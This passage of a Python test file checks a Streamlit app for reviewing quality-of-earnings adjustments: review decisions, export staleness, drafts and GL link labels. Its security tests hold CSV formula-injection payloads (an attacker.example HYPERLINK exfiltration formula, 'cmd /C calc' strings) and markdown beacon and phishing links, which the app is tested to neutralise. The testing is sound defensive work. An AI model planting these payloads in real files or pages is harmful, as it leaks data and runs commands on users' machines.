                      rationale="Policy review is one-off; include.", correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
    seed = ui.form_seed(a2, prior, LABELS)
    assert (seed["treatment"], seed["amt:FY2025"], seed["rationale"], seed["correction"]) == (
        Treatment.REVISE, "90.00", "", CorrectionType.NONE)
    # The old rationale cannot carry a different decision.
    kw = dict(reviewer="Ann", labels=LABELS, correction_type=CorrectionType.JUDGMENT_DIFFERENCE, previous=prior)
    errors, _ = decision_problems(a2, treatment=Treatment.REJECT, amounts={}, rationale=" Policy review is one-off;  include. ", **kw)
    assert any("written for the previous decision" in e for e in errors)
    errors, _ = decision_problems(a2, treatment=Treatment.REVISE, amounts={"FY2025": "90"}, rationale=prior.rationale, **kw)
    assert errors == []  # re-confirming the same decision may keep its reasons


def test_app_re_review_does_not_prefill_the_old_rationale(wp, tmp_path, monkeypatch):
    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
    at.text_input(key="reviewer").input("Ann")
    at.text_input(key="f:A-2:amt:FY2025").input("90")
    at.text_area(key="f:A-2:rationale").input("Policy review is one-off; include.")
    at.selectbox(key="f:A-2:correction").set_value(CorrectionType.JUDGMENT_DIFFERENCE)
    _click(at, "Record decision")
    assert [d.amounts["FY2025"] for d in ReviewStore.for_workpaper_dir(wdir).all()] == ["90.00"]
    assert at.text_area(key="f:A-2:rationale").value == ""
    assert at.selectbox(key="f:A-2:correction").value == CorrectionType.NONE
    assert any("Policy review is one-off" in str(h.proto) for h in at.get("html"))  # shown read-only
    at.radio(key="f:A-2:treatment").set_value(Treatment.REJECT)
    at.run()
    _click(at, "Record decision")
    assert len(ReviewStore.for_workpaper_dir(wdir).all()) == 1  # blocked: no rationale for the new decision


# -- ui-05: an out-of-date workbook is not offered ----------------------------------------


def test_export_status_tracks_the_review_state(tmp_path):
    paths = ui.workpaper_paths("toy_deal", base=tmp_path)
    paths.root.mkdir(parents=True)
    paths.workpaper.write_text("{}")
    sig = ui.review_state_signature(paths, has_pkg=True)
    assert ui.export_status(paths, sig) == (ui.EXPORT_MISSING, None)
    paths.xlsx.write_bytes(b"workbook")
    assert ui.export_status(paths, sig)[0] == ui.EXPORT_UNKNOWN  # not built by the app
    ui.write_export_stamp(paths, sig, "2026-03-01T10:00:00+00:00")
    assert ui.export_status(paths, sig) == (ui.EXPORT_CURRENT, "2026-03-01T10:00:00+00:00")
    ReviewStore(paths.review_log).append(_decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100")))
    later = ui.review_state_signature(paths, has_pkg=True)
    assert later != sig and ui.export_status(paths, later)[0] == ui.EXPORT_STALE
    q = QuestionLogEntry(kind="update", q_id="Q-1", adj_id="A-1", reviewer="B", timestamp=TS, status=QuestionStatus.CLOSED)
    ReviewStore(paths.review_log).append_question(q)
    assert ui.review_state_signature(paths, has_pkg=True) != later
    assert ui.review_state_signature(paths, has_pkg=False) != ui.review_state_signature(paths, has_pkg=True)
    ui.write_export_stamp(paths, later, "t")
    paths.xlsx.write_bytes(b"rewritten from the command line")
    assert ui.export_status(paths, later)[0] == ui.EXPORT_UNKNOWN


def test_app_export_download_is_disabled_once_a_decision_postdates_the_workbook(wp, tmp_path, monkeypatch):
    import qoe.export_xlsx

    def fake_export(w, out_path, **kw):
        Path(out_path).write_bytes(f"reviews={len(w.reviews)}".encode())
        return Path(out_path)

    monkeypatch.setattr(qoe.export_xlsx, "export_workpaper", fake_export)
    at, wdir = _app(wp, tmp_path, monkeypatch, page="Export")
    _click(at, "Build Excel workpaper")

    def xlsx_button():
        return next(d for d in at.get("download_button") if d.proto.label.startswith("Download QoE"))

    assert not xlsx_button().proto.disabled
    ReviewStore.for_workpaper_dir(wdir).append(_decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100")))
    at.run()
    assert xlsx_button().proto.disabled
    assert any("before later review changes" in t for t in _texts(at.warning))
    _click(at, "Build Excel workpaper")
    assert not xlsx_button().proto.disabled
    assert (wdir / f"QoE_Evidence_Review_{wp.deal.deal_id}.xlsx").read_bytes() == b"reviews=1"


# -- ui-06: drafts survive navigation ------------------------------------------------------


def test_app_unsent_draft_survives_next_previous_and_page_switch(wp, tmp_path, monkeypatch):
    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-3")
    at.text_area(key="f:A-3:rationale").input("DRAFT: club dues personal, travel business")
    at.run()
    _click(at, "Next")
    assert at.selectbox(key="adj_select").value == "A-4"
    _click(at, "Previous")
    assert at.text_area(key="f:A-3:rationale").value == "DRAFT: club dues personal, travel business"
    at.session_state["page"] = "Adjustment queue"
    at.run()
    assert ui.form_is_dirty(at.session_state, "A-3") and not ui.form_is_dirty(at.session_state, "A-4")
    at.session_state["page"] = "Adjustment detail"
    at.run()
    assert at.text_area(key="f:A-3:rationale").value == "DRAFT: club dues personal, travel business"
    assert any("Unsent draft" in str(h.proto) for h in at.get("html"))
    assert ReviewStore.for_workpaper_dir(wdir).all() == []


def test_queue_marks_unsent_drafts(wp):
    finals = final_amounts(wp, {})
    rows = {r["Ref"]: r for r in ui.queue_rows(wp, {}, finals, drafts=["A-3"])}
    assert rows["A-3"]["Status"] == STATUS_UNREVIEWED + ui.DRAFT_SUFFIX
    assert rows["A-3"]["Status"].split(" (")[0] == STATUS_UNREVIEWED  # status filter still works
    state = {"fd:A-3": {"rationale": "", "treatment": Treatment.REJECT}, "f:A-3:rationale": "", "f:A-3:treatment": Treatment.REJECT}
    assert not ui.form_is_dirty(state, "A-3")
    state["f:A-3:treatment"] = Treatment.ACCEPT
    assert ui.form_is_dirty(state, "A-3")


# -- ui-07: Accept on a diligence item carries the tool's proposal ------------------------


def test_accept_on_a_diligence_item_carries_the_tool_proposal_and_agrees():
    d1 = _diligence_item()
    assert resolve_amounts(d1, Treatment.ACCEPT, {}, LABELS) == _pm("0", "18400")
    errors, _ = decision_problems(d1, treatment=Treatment.ACCEPT, amounts={}, rationale="", reviewer="Ann",
                                  correction_type=CorrectionType.NONE, labels=LABELS)
    assert errors == []
    accept = make_decision(d1, treatment=Treatment.ACCEPT, amounts={}, rationale="", reviewer="Ann", labels=LABELS)
    assert (accept.treatment, accept.amounts, accept.tool_treatment) == (Treatment.ACCEPT, _pm("0", "18400"), Treatment.REVISE)
    assert not decision_is_override(accept) and review_status(d1, accept) == STATUS_AGREED
    summary = corrections_summary([accept])
    assert summary["overridden"] == 0 and summary["unclassified_overrides"] == []
    # A management item's Accept still carries the claim and overrides a REVISE proposal.
    wp = _workpaper()
    a2 = _by_id(wp)["A-2"]
    assert resolve_amounts(a2, Treatment.ACCEPT, {}, LABELS) == _pm("0", "200")
    errors, _ = decision_problems(a2, treatment=Treatment.ACCEPT, amounts={}, rationale="", reviewer="Ann",
                                  correction_type=CorrectionType.NONE, labels=LABELS)
    assert len(errors) == 2
    # A diligence item with no proposal has nothing for Accept to carry.
    empty = _diligence_item(treatment=Treatment.REQUEST_INFO, proposed={})
    errors, _ = decision_problems(empty, treatment=Treatment.ACCEPT, amounts={}, rationale="x", reviewer="Ann",
                                  correction_type=CorrectionType.JUDGMENT_DIFFERENCE, labels=LABELS)
    assert any("use Revise" in e for e in errors)
    assert ui.treatment_labels_for(d1)[Treatment.ACCEPT] == "Accept (carry the tool's amount)"
    assert ui.treatment_labels_for(a2)[Treatment.ACCEPT] == "Accept"


def test_app_accept_on_diligence_item_records_the_proposal(tmp_path, monkeypatch):
    wp = _wp_with_diligence(store_schedule=True)
    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="D-1")
    at.text_input(key="reviewer").input("Ann")
    at.radio(key="f:D-1:treatment").set_value(Treatment.ACCEPT)
    at.run()
    assert any("tool's proposed diligence amount" in c for c in _texts(at.caption))
    assert not any("Needed before recording" in t for t in _texts(at.warning))
    _click(at, "Record decision")
    [d] = ReviewStore.for_workpaper_dir(wdir).all()
    assert (d.treatment, d.amounts, d.correction_type) == (Treatment.ACCEPT, _pm("0", "18400"), CorrectionType.NONE)


# -- ui-08: flag amounts are labelled by what they measure --------------------------------


def test_flag_amounts_show_ebitda_effects_only_from_flag_effects():
    excess = Flag(code=FlagCode.EXCESS_GL_ACTIVITY, severity=Severity.INFO, message="Other 126,000 is context.",
                  period_label="FY2025", amount_impact="126000")
    assert ui.flag_amount_notes(excess) == ["Context activity (not claimed) 126,000"]
    assert "EBITDA effect" not in ui.flag_html(excess)
    partial = Flag(code=FlagCode.PARTIAL_GL_SUPPORT, severity=Severity.WARNING, message="m", amount_impact="-5000")
    assert ui.flag_amount_notes(partial) == ["GL shortfall (5,000)"]
    overlap = Flag(code=FlagCode.OVERLAP_WITH_OTHER_ADJUSTMENT, severity=Severity.WARNING, message="m",
                   effects={"TTM Jun-26": "-21000", "FY2025": "-21000", "FY2024": "0"})
    assert ui.flag_amount_notes(overlap, ["FY2024", "FY2025", "TTM Jun-26"]) == [
        "EBITDA effect FY2025 (21,000)", "EBITDA effect TTM Jun-26 (21,000)"]
    assert "EBITDA effect FY2025 (21,000)" in ui.flag_html(overlap, ["FY2025", "TTM Jun-26"])
    other = Flag(code=FlagCode.SIGN_ERROR, severity=Severity.WARNING, message="m", amount_impact="-5")
    assert ui.flag_amount_notes(other) == ["Amount at issue (5)"]


# -- ui-11 / ui-12: GL link roles ---------------------------------------------------------


def _roles_assessment() -> AdjustmentAssessment:
    links = [
        GLLink(entry_id="GL-R10", period="2025-02", amount="5000.00", score=3.0, role="supporting", claimed=True),
        GLLink(entry_id="GL-R11", period="2025-03", amount="7000.00", score=3.0, role="removed", claimed=True,
               removed_by=FlagCode.CONTRADICTORY_EVIDENCE, supports_claim=False),
        GLLink(entry_id="GL-R12", period="2025-04", amount="3000.00", score=3.0, role="moved", claimed=True),
        GLLink(entry_id="GL-R13", period="2025-05", amount="-2000.00", score=2.0, role="recovery", supports_claim=False),
        GLLink(entry_id="GL-R3", period="2024-03", amount="6000.00", score=2.0, role="context", supports_claim=False),
    ]
    return _assessment("A-9", Treatment.REVISE, _pm("0", "15000"), _pm("0", "6000"), traced_gl=_pm("0", "15000"), gl_links=links)


def test_gl_link_rows_label_claimed_removed_moved_recovery_and_context():
    a = _roles_assessment()
    rows = ui.gl_link_rows(a, {})
    assert [(r["GL row"], r["Role"]) for r in rows] == [
        (10, "Supporting (claimed, carried)"),
        (12, "Claimed, carried in another period"),
        (11, "Claimed, removed by Contradictory evidence"),
        (13, "Recovery (offsets the claim)"),
        (3, "Context (not part of the claim)"),
    ]
    assert list(ui.gl_role_counts(a).values()) == [1, 1, 1, 1, 1]
    periods = [PeriodDef(label="FY2024", start="2024-01", end="2024-12"), PeriodDef(label="FY2025", start="2025-01", end="2025-12")]
    tie = {r["Line"]: r for r in ui.claimed_link_tieout(a, periods)}
    assert tie["Claimed entries listed (by GL month)"]["FY2025"] == "15,000"  # ties to Traced to GL
    assert tie["of which still carried"]["FY2025"] == "8,000"
    assert tie["Traced to GL (tie-out)"]["FY2025"] == "15,000" and tie["Difference"]["FY2025"] == "-"
    assert tie["Claimed entries listed (by GL month)"]["FY2024"] == "-"  # the comparable is context, not claimed


def test_gl_link_roles_fall_back_for_older_workpapers():
    removed = GLLink(entry_id="GL-R5", period="2025-01", amount="1.00", score=1.0, supports_claim=False,
                     reasons=["account", "Removed (CONTINUING_OBLIGATION): retainer continues"])
    context = GLLink(entry_id="GL-R6", period="2024-01", amount="1.00", score=1.0, supports_claim=False, reasons=["Context only: no claim"])
    supporting = GLLink(entry_id="GL-R7", period="2025-01", amount="1.00", score=1.0)
    assert ui.link_role(removed) == ("removed", FlagCode.CONTINUING_OBLIGATION)
    assert ui.link_role(context) == ("context", None) and ui.link_role(supporting) == ("supporting", None)
    assert ui.link_is_claimed(removed) and not ui.link_is_claimed(context)


def test_queue_gl_link_counts_match_the_workbook_columns():
    wp = _workpaper()
    wp.assessments.append(_roles_assessment())
    all_removed = _assessment("A-6", Treatment.REJECT, _pm("0", "96"), _pm("0", "0"), gl_links=[
        GLLink(entry_id=f"GL-R{i}", period="2025-01", amount="8.00", score=1.0, role="removed", claimed=True,
               removed_by=FlagCode.RECURRING_PATTERN, supports_claim=False) for i in range(20, 32)])
    wp.assessments.append(all_removed)
    rows = {r["Ref"]: r for r in ui.queue_rows(wp, {}, final_amounts(wp, {}))}
    assert (rows["A-9"]["GL links"], rows["A-9"]["Supporting GL links"]) == (5, 2)
    assert (rows["A-6"]["GL links"], rows["A-6"]["Supporting GL links"]) == (12, 0)


# -- ui-13: grids show their rows; compact queue; row click opens -------------------------


def test_queue_grid_is_compact_and_sized_to_its_rows():
    compact = ui.queue_columns(LABELS, all_columns=False)
    assert compact == ["Ref", "Title", "Tool", "Reviewer", "Status", "Bridge", "Final FY2024", "Final FY2025", "Open Qs", "Top flags"]
    widths = ui.queue_widths(compact)
    assert set(widths) == set(compact) and sum(widths.values()) - widths["Top flags"] + 32 <= 1040  # fits 1,500px with the sidebar
    assert set(compact) < set(ui.queue_columns(LABELS))
    assert ui.table_height(14, None) == "content" and ui.table_height(300, None) == "content"
    assert ui.table_height(22) == "content" and ui.table_height(60, 25) == 35 * 26 + 3
    assert ui.selected_ref(["A-1", "A-2"], {"selection": {"rows": [1], "columns": []}}) == "A-2"
    assert ui.selected_ref(["A-1"], {"selection": {"rows": []}}) is None
    assert ui.selected_ref(["A-1"], None) is None and ui.selected_ref(["A-1"], {"selection": {"rows": [5]}}) is None


def test_app_queue_rows_are_selectable_and_questions_show_every_row(wp, tmp_path, monkeypatch):
    at, _ = _app(wp, tmp_path, monkeypatch, page="Adjustment queue")
    assert [list(df.proto.selection_mode) for df in at.dataframe] == [[0]]  # single-row selection
    many = wp.model_copy(deep=True)
    a4 = _by_id(many)["A-4"]
    a4.open_questions = [OpenQuestion(q_id=f"Q-A-4-{i}", adj_id="A-4", text=f"Question number {i}") for i in range(1, 23)]
    at, _ = _app(many, tmp_path / "many", monkeypatch, page="Open questions")
    table = " ".join(str(h.proto) for h in at.get("html"))
    assert all(f"Q-A-4-{i}<" in table for i in range(1, 23))


# -- ui-14 / security-csv-formula-injection: the information request list -----------------


def test_request_list_exports_exactly_the_filtered_rows_without_internal_codes(wp):
    rows = ui.question_rows(wp)
    assert ui.filter_question_rows(rows, priorities=["low"]) == []
    assert ui.request_list_csv([]).decode().strip() == ",".join(ui.REQUEST_LIST_COLUMNS)
    shown = ui.filter_question_rows(rows, statuses=["OPEN"], priorities=["high"])
    assert [r["Q id"] for r in shown] == ["Q-A-4-1"]
    text = ui.request_list_csv(shown).decode()
    assert "Basis" not in text.splitlines()[0] and len(text.strip().splitlines()) == 2


def test_request_list_csv_neutralizes_formula_cells():
    payloads = [
        '=HYPERLINK("http://attacker.example/leak?"&A2,"Open data request")',
        "+cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "\t=1+1",
        "\r=1+1",
        "  =1+1",
        "＝HYPERLINK(1)",
    ]
    rows = [{"Q id": "Q-1", "Ref": p, "Question": p, "Priority": "high", "Status": "OPEN", "Response": p} for p in payloads]
    import csv as _csv

    parsed = list(_csv.reader(io.StringIO(ui.request_list_csv(rows).decode())))
    for rec in parsed[1:]:
        for cell in (rec[1], rec[2], rec[5]):
            assert cell.startswith("'"), cell
    assert ui.csv_safe("Provide the executed agreement.") == "Provide the executed agreement."
    assert ui.csv_safe(12) == 12


def test_app_empty_filter_disables_the_csv_download(wp, tmp_path, monkeypatch):
    at, _ = _app(wp, tmp_path, monkeypatch, page="Open questions")
    at.multiselect(key="oq_f_prio").set_value(["low"]).run()
    [dl] = [d for d in at.get("download_button") if "CSV" in d.proto.label]
    assert dl.proto.disabled
    assert "No questions match the filters." in _texts(at.caption)
    assert not any(b.label == "Record update" for b in at.button)


# -- ui-17: accessible colours ------------------------------------------------------------


def _contrast(fg: str, bg: str) -> float:
    def lum(h: str) -> float:
        r, g, b = (int(h.lstrip("#")[i : i + 2], 16) / 255 for i in (0, 2, 4))
        f = lambda c: c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4  # noqa: E731
        return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b)

    hi, lo = sorted((lum(fg), lum(bg)), reverse=True)
    return (hi + 0.05) / (lo + 0.05)


def test_theme_and_css_meet_contrast_minimums():
    import tomllib

    config = tomllib.loads((ROOT / ".streamlit" / "config.toml").read_text())
    primary = config["theme"]["primaryColor"]
    assert primary == ui.PRIMARY_COLOR
    assert _contrast("#FFFFFF", primary) >= 4.5  # button text
    assert _contrast(primary, "#FFFFFF") >= 3 and _contrast(primary, "#0E1117") >= 3  # control vs light/dark page
    assert "#1F3864" not in ui._CSS  # the diligence heading row inherits the theme's text colour
    assert 'data-testid="stCaptionContainer"' in ui._CSS and "color:inherit" in ui._CSS


def test_app_pre_submit_problems_are_shown_as_warnings(wp, tmp_path, monkeypatch):
    at, _ = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
    assert any(t.startswith("Needed before recording: Enter the reviewer's name.") for t in _texts(at.warning))
    assert not any("Before recording" in t for t in _texts(at.caption))


# -- ui-18: bridge label -------------------------------------------------------------------


def test_bridge_status_says_how_the_item_is_carried():
    assert ui.bridge_status({}) == "Excluded (pending)"
    assert ui.bridge_status(_pm("0", "0")) == "Carried at 0"
    assert ui.bridge_status(_pm("0", "-40")) == "Carried"


# -- ui-19: holdout is opt-in --------------------------------------------------------------


def test_holdout_is_hidden_unless_opted_in(tmp_path, monkeypatch):
    monkeypatch.delenv(ui.SHOW_HOLDOUT_ENV, raising=False)
    for split, name in (("dev", "alpha"), ("holdout", "beta")):
        (tmp_path / split / name).mkdir(parents=True)
        (tmp_path / split / name / "deal.yaml").write_text(f"deal_id: {name}\ntarget_name: {name}\n")
    assert [d.deal_id for d in ui.discover_deals(tmp_path)] == ["alpha"]
    assert ui.find_deal_dir("beta", tmp_path) is None
    assert ui.is_holdout_path(tmp_path / "holdout" / "beta", tmp_path)
    assert not ui.is_holdout_path(tmp_path / "dev" / "alpha", tmp_path)
    monkeypatch.setenv(ui.SHOW_HOLDOUT_ENV, "1")
    assert [d.deal_id for d in ui.discover_deals(tmp_path)] == ["alpha", "beta"]


def test_app_refuses_a_holdout_path_without_the_opt_in(tmp_path, monkeypatch):
    testing = pytest.importorskip("streamlit.testing.v1")
    monkeypatch.delenv(ui.SHOW_HOLDOUT_ENV, raising=False)
    holdout = tmp_path / "data" / "holdout" / "beta"
    holdout.mkdir(parents=True)
    (holdout / "deal.yaml").write_text("deal_id: beta\ntarget_name: Secret Target\n")
    monkeypatch.setenv("QOE_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("QOE_WORKPAPERS_DIR", str(tmp_path / "wp"))
    at = testing.AppTest.from_file(str(ROOT / "qoe" / "ui.py"), default_timeout=60)
    at.run()
    assert not at.sidebar.selectbox  # nothing listed in the Library
    at.sidebar.radio(key="deal_source").set_value("Path").run()
    at.sidebar.text_input(key="deal_path").input(str(holdout)).run()
    assert any("Held-out deal packages are hidden" in _plain(w.value) for w in at.sidebar.warning)
    assert not any(b.label == "Run review" for b in at.sidebar.button)
    assert "Secret Target" not in " ".join(str(e.value) for e in at.sidebar.caption)


# -- security-ui-markdown-injection ---------------------------------------------------------


def test_md_escapes_markdown_links_images_directives_and_math():
    hostile = "M-04 ![](https://attacker.example/b.png?who=r) [View](https://phish.example/login) :red[x] $x$ **b**"
    out = ui.md(hostile)
    assert "![](" not in out and "](" not in out and "$x$" not in out and ":red[" not in out and "**" not in out
    assert _plain(out) == hostile
    assert ui.md("a\n# heading") == "a \\# heading"


def test_app_seller_ref_is_rendered_inert(tmp_path, monkeypatch):
    hostile = "M-04 ![](https://attacker.example/beacon.png) [View agreement](https://phish.example/login)"
    wp = _workpaper()
    wp.assessments[0] = wp.assessments[0].model_copy(update={"adj_id": hostile})
    at, _ = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj=hostile)
    at.text_input(key="reviewer").input("Ann")
    at.run()
    _click(at, "Record decision")
    bodies = [m.value for m in at.success]
    assert bodies and all("](" not in b for b in bodies)
    assert any(hostile in _plain(b) for b in bodies)


# -- security-ui-unauthenticated-network ----------------------------------------------------


def test_ui_binds_to_localhost_by_default():
    import tomllib

    makefile = (ROOT / "Makefile").read_text()
    ui_target = makefile.split("\nui:\n", 1)[1].split("\n\n", 1)[0]
    assert "--server.address 127.0.0.1" in ui_target
    config = tomllib.loads((ROOT / ".streamlit" / "config.toml").read_text())
    assert config["server"]["address"] == "127.0.0.1"


# -- excel-pending-without-question: Request info needs an open question -------------------


def test_request_info_requires_an_open_question(wp):
    a = _by_id(wp)
    kw = dict(amounts={}, rationale="Need support.", reviewer="Ann", labels=LABELS, correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
    errors, _ = decision_problems(a["A-1"], treatment=Treatment.REQUEST_INFO, **kw)
    assert any("add a question for management" in e for e in errors)
    errors, _ = decision_problems(a["A-1"], treatment=Treatment.REQUEST_INFO,
                                  questions=questions_after(a["A-1"].open_questions, new_texts=["Provide the invoice."]), **kw)
    assert errors == []
    # Closing every open question in the same form leaves nothing asked.
    closed = questions_after(a["A-4"].open_questions, {"Q-A-4-1": "CLOSED", "Q-A-4-2": "ANSWERED: yes"})
    errors, _ = decision_problems(a["A-4"], treatment=Treatment.REQUEST_INFO, questions=closed, **kw)
    assert any("add a question for management" in e for e in errors)
    errors, _ = decision_problems(a["A-4"], treatment=Treatment.REQUEST_INFO, **kw)
    assert not any("question" in e for e in errors)


def test_reviewer_raised_questions_join_the_workpaper(wp, tmp_path):
    store = ReviewStore(tmp_path / "review_log.jsonl")
    with pytest.raises(DecisionError):
        store.add_question(adj_id="A-1", text="  ", reviewer="Ann")
    first = store.add_question(adj_id="A-1", text="Provide  the\ninvoice.", reviewer=" Ann ", priority="high", timestamp=TS)
    second = store.add_question(adj_id="A-1", text="Who approved it?", reviewer="Ann", priority="bogus")
    assert (first.q_id, first.text, first.reviewer, second.q_id, second.priority) == (
        "Q-A-1-R1", "Provide the invoice.", "Ann", "Q-A-1-R2", "medium")
    out = apply_reviews(wp, [], question_log=store.questions())
    qs = _by_id(out)["A-1"].open_questions
    assert [(q.q_id, q.status, q.basis) for q in qs] == [
        ("Q-A-1-R1", QuestionStatus.OPEN, "Raised by reviewer Ann"), ("Q-A-1-R2", QuestionStatus.OPEN, "Raised by reviewer Ann")]
    again = apply_reviews(out, [], question_log=store.questions())  # re-applying adds nothing twice
    assert [q.q_id for q in _by_id(again)["A-1"].open_questions] == ["Q-A-1-R1", "Q-A-1-R2"]
    assert ui.status_counts(out, {}, final_amounts(out, {}))["pending_without_question"] == []
    # A pending item with nothing asked is surfaced.
    info = _decision("A-3", Treatment.REQUEST_INFO, {}, Treatment.REJECT, _pm("0", "0"))
    assert ui.status_counts(wp, {"A-3": info}, final_amounts(wp, {"A-3": info}))["pending_without_question"] == ["A-3"]


def test_app_request_info_records_the_new_question_with_the_decision(wp, tmp_path, monkeypatch):
    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-1")
    at.text_input(key="reviewer").input("Ann")
    at.radio(key="f:A-1:treatment").set_value(Treatment.REQUEST_INFO)
    at.text_area(key="f:A-1:rationale").input("Invoice needed before accepting.")
    at.selectbox(key="f:A-1:correction").set_value(CorrectionType.NEW_INFORMATION)
    at.run()
    _click(at, "Record decision")
    store = ReviewStore.for_workpaper_dir(wdir)
    assert store.all() == []
    assert any("add a question for management" in t for t in _texts(at.error))
    at.text_area(key="f:A-1:newq").input("Please provide the vendor invoice.")
    at.run()
    _click(at, "Record decision")
    [d] = store.all()
    [q] = store.questions()
    assert (d.treatment, d.question_updates) == (Treatment.REQUEST_INFO, {})
    assert (q.kind, q.q_id, q.reviewer, q.priority, q.timestamp) == ("new", "Q-A-1-R1", "Ann", "high", d.timestamp)
    at.session_state["page"] = "Open questions"
    at.run()
    assert "Q-A-1-R1" in " ".join(str(h.proto) for h in at.get("html"))


def test_review_form_question_edits_go_to_the_question_log(wp, tmp_path, monkeypatch):
    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-4")
    at.text_input(key="reviewer").input("Ann")
    at.selectbox(key="f:A-4:q:Q-A-4-2:status").set_value(QuestionStatus.CLOSED)
    at.run()
    _click(at, "Record decision")
    store = ReviewStore.for_workpaper_dir(wdir)
    [d] = store.all()
    assert (d.treatment, d.question_updates) == (Treatment.REQUEST_INFO, {})
    assert [(e.q_id, e.status, e.reviewer, e.timestamp) for e in store.questions()] == [
        ("Q-A-4-2", QuestionStatus.CLOSED, "Ann", d.timestamp)]
    # A question answered elsewhere after the form was opened is not reverted by recording the form.
    at.session_state["adj_select"] = "A-4"
    at.run()
    q1 = _by_id(wp)["A-4"].open_questions[0]
    store.append_question(make_question_update(q1, adj_id="A-4", status=QuestionStatus.ANSWERED, response="Sent", reviewer="Bob"))
    at.run()
    assert at.selectbox(key="f:A-4:q:Q-A-4-1:status").value == QuestionStatus.ANSWERED  # the form follows the log
    at.text_area(key="f:A-4:newq").input("Provide the signed agreement.")
    at.run()
    _click(at, "Record decision")
    assert len(store.all()) == 2
    assert [(e.reviewer, e.q_id) for e in store.questions()] == [("Ann", "Q-A-4-2"), ("Bob", "Q-A-4-1"), ("Ann", "Q-A-4-R1")]
    out = apply_reviews(wp, store.all(), question_log=store.questions())
    qs = {q.q_id: q for q in _by_id(out)["A-4"].open_questions}
    assert (qs["Q-A-4-1"].status, qs["Q-A-4-1"].response) == (QuestionStatus.ANSWERED, "Sent")
